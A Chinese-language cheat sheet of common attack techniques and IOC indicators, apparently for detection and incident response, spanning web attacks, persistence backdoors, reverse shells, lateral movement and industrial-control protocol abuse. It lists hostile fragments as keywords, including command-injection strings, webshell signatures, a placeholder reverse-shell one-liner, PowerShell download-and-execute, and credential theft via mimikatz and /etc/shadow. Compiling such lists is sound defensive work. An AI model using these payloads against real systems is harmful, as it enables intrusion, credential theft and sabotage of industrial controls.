# 常见攻击手法与 IOC 指标

## Web 应用攻击
- SQL 注入：union select、information_schema、sleep()、benchmark()、报错注入 extractvalue/updatexml
- 命令注入 / RCE：; cat /etc/passwd、|、&&、$()、反引号、${}、eval、system、passthru、exec
- 文件包含 LFI/RFI：../../etc/passwd、php://filter、expect://、phar://
- 文件上传绕过：.php5、.phtml、.htaccess、00 截断、图片马 + 解析漏洞
- 反序列化：PHP unserialize、Java 反序列化（CommonsCollections、Fastjson）、Python pickle
- Webshell 特征：eval(、base64_decode(、assert(、($_POST、$_REQUEST、create_function、array_map

## 权限维持 / 后门
- WebShell：一句话木马、内存马（Java Filter/Servlet、PHP 不死马）
- 计划任务：crontab 写入恶意脚本、Windows 计划任务
- 启动项 / 服务：systemd unit、rc.local、/etc/init.d、注册表 Run 键
- 账号后门：隐藏用户（Linux 的 uid=0 同名、$ 结尾用户）、SSH 公钥植入 ~/.ssh/authorized_keys
- 库文件劫持：LD_PRELOAD、/etc/ld.so.preload、恶意 .so、PHP 扩展

## 反弹 Shell / 横向移动
- 反弹 shell：bash -i >& /dev/tcp/ip/port 0>&1、nc -e、python socket、powershell Invoke-WebRequest + IEX
- 内网探测：masscan、nmap、arp 扫描、netdiscover
- 凭证窃取：hashdump、mimikatz、/etc/shadow、.ssh、配置文件中的明文口令
- 横向：SSH 口令复用、SMB/WMIC、psexec、Pass-the-Hash

## 工控/能源场景特有
- 协议未授权访问：Modbus TCP 502、IEC 60870-5-104 2404、DNP3 20000、OPC UA 4840、S7 102
- 危险写操作：线圈/寄存器写（功能码 05/06/15/16）、置位/复位、控制指令下发
- 历史数据篡改：遥测点值篡改、SOE 顺序事件记录伪造
- HMI/SCADA 默认口令、Web 管理后台弱口令

## 通用 IOC 思路
- 异常外连：非业务 IP 的出站连接、非常规端口
- 可疑进程名：随机字符串、tmp 目录可执行、隐藏进程
- 新增可执行文件：Web 目录新增 .php/.jsp/.py、/tmp 下二进制
- 时间线突变：在攻击窗口期被修改的文件/权限/服务
